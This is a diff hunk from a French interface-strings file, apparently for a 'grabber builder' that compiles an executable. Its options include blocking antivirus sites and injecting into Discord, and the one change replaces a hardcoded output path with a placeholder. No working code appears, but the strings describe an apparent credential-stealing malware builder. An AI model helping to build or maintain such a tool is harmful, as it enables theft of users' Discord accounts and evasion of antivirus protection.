@@ -253,7 +253,7 @@ Bloquer les sites AV (O/N)
 Injection Discord (O/N)
 Icône de fichier
 Création de {name}.exe, cela prendra quelques secondes. Merci pour votre patience !
-Le fichier est dans 'output/grabberbuilder/{name}.exe
+Le fichier est dans {path}
 Groupe créé
 Limite de taux ({response.json()['retry_after']}ms)
 Pas assez d'amis disponibles pour une sélection aléatoire
